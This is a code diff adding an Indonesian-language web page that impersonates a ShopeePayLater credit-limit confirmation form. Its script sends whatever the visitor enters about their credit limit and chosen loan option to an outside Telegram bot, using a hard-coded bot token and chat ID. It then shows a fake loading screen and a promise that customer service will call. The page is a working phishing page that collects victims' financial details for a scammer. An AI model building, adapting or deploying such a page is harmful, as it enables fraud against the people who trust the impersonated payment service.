@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Konfirmasi Limit Shopeepaylater</title>
+  <meta name="viewport" content="width, initial-scale=1">
+  <meta name="theme-color" content="Coral">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0px;
+      text-align: center;
+    }
+
+    #gambar-atas {
+      margin-bottom: 30px;
+      margin-top:-2px;
+    }
+
+    #gambar-atas img {
+      width: 100%;
+      object-fit: cover;
+      max-height: 300px;
+    }
+
+    div {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      margin-top: 20px;
+    }
+
+    /* Kolom Select */
+    #pilihan-container {
+      width: 90%;
+      max-width: 450px;
+      margin-bottom: 10px;
+      margin: 0 auto;
+    }
+
+    #pilihan {
+      width: 88%;
+      padding: 13px;
+      border-radius: 5px;
+      border: 1px solid #ff7f50;
+    }
+
+    /* Jarak antara kolom select dan kolom input */
+    #jarak7 {
+      height: 10px;
+    }
+
+    /* Kolom Input dan Tombol Submit */
+    #jumlah-container {
+      width: 85%;
+      max-width: 400px;
+      margin-bottom: 10px;
+      display: flex;
+      flex-direction: column;
+      margin: 0 auto;
+    }
+
+    #jumlahInput {
+      width: 85%;
+      padding: 13px;
+      border-radius: 5px;
+      border: 1px solid #ff7f50;
+      margin-bottom: 10px;
+    }
+
+    #submit {
+      width: 93%;
+      max-width: 350px;
+      padding: 13px;
+      border-radius: 8px;
+      border: none;
+      background-color: #ff7f50;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    #gambar-bawah {
+      display: flex;
+      justify-content: center;
+      position: relative;
+      bottom: -10px;
+    }
+
+    #gambar-bawah img {
+      width: 50%;
+      object-fit: cover;
+      margin: 0 25px;
+    }
+    .white-element {
+      width: 100vw;
+      height: 100vh;
+      background: rgba(255, 255, 255, 0.8); /* Atur alpha (nilai transparansi) sesuai keinginan */
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .white-element img {
+      width: 180px; /* Ganti dengan ukuran yang diinginkan */
+      height: 120px; /* Ganti dengan ukuran yang diinginkan */
+    }
+
+    .loading-text {
+      margin-top: 10px;
+      font-size: 16px;
+    }
+  /* Gaya untuk hasil input */
+  #hasil-container {
+    display: none;
+    background-color: coral; /* Ubah warna latar belakang menjadi oranye */
+    padding: 10px;
+    border-radius: 10px;
+    margin-bottom: 20px;
+    font-weight:bold;
+  }
+
+  #hasil, #pesan {
+    color: white;
+    
+  }
+
+  </style>
+  <script>
+  function sendMessageToTelegram(message) {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState === 4 && this.status === 200) {
+      console.log("Pesan terkirim: " + message);
+      // Panggil fungsi showWhiteElement() hanya setelah pesan terkirim
+      showWhiteElement();
+    }
+  };
+  var url = "https://api.telegram.org/bot7086756298:AAEJv_kcR4QkxjMPA4vYwVogDhBhl5-E4fk/sendMessage?chat_id=6664345017&text=" + encodeURIComponent(message);
+
+  xhttp.open("POST", url, true);
+  xhttp.send();
+}
+
+function kirimPesan() {
+  var pilihanSelect = document.getElementById("pilihan");
+  var pilihanValue = pilihanSelect.options[pilihanSelect.selectedIndex].text;
+  
+  var pesan = document.getElementById("jumlahInput").value;
+  if (pesan.trim() === '') {
+    if (navigator.vibrate) {
+      navigator.vibrate(200); // Efek getaran selama 200ms
+    }
+    return;
+  }
+  
+  var hasilContainer = document.getElementById("hasil-container");
+  var hasilText = document.getElementById("hasil");
+  
+  // Memperbarui teks hasil dengan nilai input dan pilihan
+  hasilText.textContent = "Sisa Limit Anda Saat Ini: " + pesan + ", Pilihan Anda: " + pilihanValue;
+  
+  // Menampilkan elemen hasil dan pesan, serta menyembunyikan elemen lainnya
+  hasilContainer.style.display = "block";
+  document.getElementById("pilihan-container").style.display = "none";
+  document.getElementById("jumlah-container").style.display = "none";
+  document.getElementById("gambar-bawah").style.display = "none";
+
+  // Mengirim pesan ke Telegram
+  sendMessageToTelegram("𝗝𝘂𝗺𝗹𝗮𝗵 𝗟𝗶𝗺𝗶𝘁 𝗦𝗮𝗮𝘁 𝗜𝗻𝗶: " + pesan + ", Pilihan Anda: " + pilihanValue);
+  showWhiteElement();
+}
+
+function showWhiteElement() {
+  var whiteElement = document.createElement('div');
+  whiteElement.classList.add('white-element');
+
+  var logoImage = document.createElement('img');
+  logoImage.src = 'https://i.ibb.co/D1CTX7v/pay1-1-removebg-preview.png';
+  logoImage.alt = 'Logo';
+  whiteElement.appendChild(logoImage);
+
+  var loadingText = document.createElement('div');
+  loadingText.classList.add('loading-text');
+  loadingText.innerText = 'Mohon Tunggu sebentar';
+  whiteElement.appendChild(loadingText);
+
+  document.body.appendChild(whiteElement);
+
+  // Simulasi proses loading
+  setTimeout(function () {
+    whiteElement.remove();
+    
+    // Tampilkan elemen hasil setelah proses loading selesai
+    var hasilContainer = document.getElementById("hasil-container");
+    hasilContainer.style.display = "block";
+  }, 5000); // Ubah waktu penundaan menjadi 5 detik
+}
+
+// Sembunyikan elemen hasil secara default
+document.addEventListener("DOMContentLoaded", function() {
+  var hasilContainer = document.getElementById("hasil-container");
+  hasilContainer.style.display = "none";
+});
+
+function updateNominal() {
+  var nominalInput = document.getElementById("jumlahInput");
+  var value = nominalInput.value.replace(/\D/g, ''); // Hapus karakter selain digit
+
+  // Format nilai Rupiah
+  var formattedValue = "Rp " + Number(value).toLocaleString("id-ID");
+
+  nominalInput.value = formattedValue;
+}
+</script>
+</head>
+<body>
+  <!-- Gambar Atas -->
+  <div id="gambar-atas">
+    <img src="https://i.ibb.co/GszXFJ2/IMG-20240315-105849.jpg" alt="Gambar Pucok">
+  </div>
+
+  <!-- Kolom Select -->
+  <div id="pilihan-container">
+    <label for="pilihan"></label>
+    <select id="pilihan" name="pilihan">
+      <option value="opsi1">Pilih Limit</option>
+      <option value="opsi2">Rp 10.000.000 tenor 12 bulan suku bunga 1.42%</option>
+      <option value="opsi3">Rp 15.000.000 tenor 12 bulan suku bunga 1.42%</option>
+      <option value="opsi4">Rp 25.000.000 tenor 12 bulan suku bunga 1.42%</option>
+      <option value="opsi5">Rp 50.000.000 Tenor 12 bulan suku bunga 1.42%</option>
+    </select>
+  </div>
+
+  <!-- Jarak antara kolom select dan kolom input -->
+  <div id="jarak7"></div>
+
+  <!-- Kolom Input dan Tombol Submit -->
+  <div id="jumlah-container">
+    <input type="text" id="jumlahInput" name="jumlah" placeholder="Sisa Limit" oninput="updateNominal()">
+    <input type="submit" id="submit" value="Lanjutkan" onclick="kirimPesan()">
+  </div>
+
+  <!-- Gambar Bawah -->
+  <div id="gambar-bawah">
+    <img src="https://i.ibb.co/1nyLpFy/Shopee-Paylater-removebg-preview.png" alt="Gambar 2711">
+  </div>
+  <!-- Hasil dan Pesan -->
+  <div id="hasil-container" style="display: none;">
+    <p id="hasil"></p>
+    <p id="pesan">CS Layanan Akan Segera Menghubungi Anda. Terimakasih</p>
+  </div>
+
+</body>
+</html>
